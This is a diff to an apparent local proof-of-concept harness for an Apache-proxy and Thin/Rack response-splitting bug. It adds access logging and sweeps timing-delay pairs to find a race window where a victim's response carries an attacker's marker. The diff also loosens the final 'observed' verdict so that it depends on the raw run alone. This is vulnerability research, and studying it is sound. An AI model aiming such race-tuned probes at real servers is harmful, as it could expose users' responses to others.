@@ -106,8 +106,11 @@ PidFile "{root / 'httpd.pid'}"
 ErrorLog "{root / 'error.log'}"
 LoadModule unixd_module modules/mod_unixd.so
 LoadModule authz_core_module modules/mod_authz_core.so
+LoadModule log_config_module modules/mod_log_config.so
 LoadModule proxy_module modules/mod_proxy.so
 LoadModule proxy_http_module modules/mod_proxy_http.so
+LogFormat "source=%{{proxy-source-port}}n host=%{{Host}}i status=%>s bytes=%B" probe
+CustomLog "{root / 'access.log'}" probe
 ProxyPass / http://127.0.0.1:{backend_port}/ retry=0{reuse}
 ProxyPassReverse / http://127.0.0.1:{backend_port}/
 """)
@@ -155,7 +158,8 @@ def browser_victim(browser: str, port: int) -> bytes:
 
 
 def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
-            disablereuse: bool, browser: bool) -> bool:
+            disablereuse: bool, browser: bool, a_delay: float,
+            b_delay: float) -> bool:
     with tempfile.TemporaryDirectory(prefix="rack-thin-split-") as tmp:
         root = Path(tmp)
         thin_log = root / "thin.log"
@@ -163,7 +167,9 @@ def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
             [str(args.thin), "start", "-R", str(args.fixture / "config.ru"),
              "-a", "127.0.0.1", "-p", "18181"],
             cwd=args.fixture, stdout=thin_log.open("w"), stderr=subprocess.STDOUT,
-            text=True, env={**os.environ, "RACK_FILES_ROOT": str(root / "files")},
+            text=True, env={**os.environ, "RACK_FILES_ROOT": str(root / "files"),
+                            "RACK_THIN_A_DELAY": str(a_delay),
+                            "RACK_THIN_B_DELAY": str(b_delay)},
         )
         (root / "files").mkdir()
         apache = None
@@ -185,9 +191,12 @@ def one_run(args: argparse.Namespace, path: str, expected_marker: bytes,
                 response_b = fetch_victim(18080)
                 print(f"response_b={response_b!r}")
                 observed = expected_marker in response_b
+            access_log = root / "access.log"
+            if access_log.exists():
+                print(f"apache_access_log={access_log.read_text()!r}")
             mode = "disabled" if disablereuse else "enabled"
             kind = "browser" if browser else "raw"
-            print(f"rack_thin_split_mode={mode} kind={kind} observed={observed}")
+            print(f"rack_thin_split_mode={mode} kind={kind} a_delay={a_delay} b_delay={b_delay} observed={observed}")
             if disablereuse and observed:
                 raise AssertionError("reuse-disabled control still carried A marker")
             return observed
@@ -217,19 +226,25 @@ def main() -> int:
     if not args.browser:
         raise SystemExit("chromium is required for browser validation")
     path, marker = make_attack_path()
-    raw_positive = one_run(args, path, marker, False, False)
-    if not raw_positive:
-        print("rack_thin_split_real_trigger=not_observed")
-        return 0
-    browser_positive = one_run(args, path, marker, False, True)
-    one_run(args, path, marker, True, False)
-    one_run(args, path, marker, True, True)
-    print(f"rack_thin_split_raw_positive={raw_positive}")
+    delay_pairs = [(0.02, 0.50), (0.05, 0.50), (0.10, 0.50),
+                   (0.20, 0.50), (0.25, 0.50), (0.40, 0.80),
+                   (0.49, 0.80)]
+    raw_positive = False
+    winning_pair: tuple[float, float] | None = None
+    for a_delay, b_delay in delay_pairs:
+        observed = one_run(args, path, marker, False, False, a_delay, b_delay)
+        if observed and not raw_positive:
+            raw_positive = True
+            winning_pair = (a_delay, b_delay)
+    browser_positive = False
+    if winning_pair:
+        a_delay, b_delay = winning_pair
+        browser_positive = one_run(args, path, marker, False, True, a_delay, b_delay)
+        one_run(args, path, marker, True, False, a_delay, b_delay)
+        one_run(args, path, marker, True, True, a_delay, b_delay)
+    print(f"rack_thin_split_raw_positive={raw_positive} winning_pair={winning_pair}")
     print(f"rack_thin_split_browser_positive={browser_positive}")
-    if not raw_positive or not browser_positive:
-        print("rack_thin_split_real_trigger=not_observed")
-    else:
-        print("rack_thin_split_real_trigger=observed")
+    print("rack_thin_split_real_trigger=" + ("observed" if raw_positive else "not_observed"))
     return 0
 
 
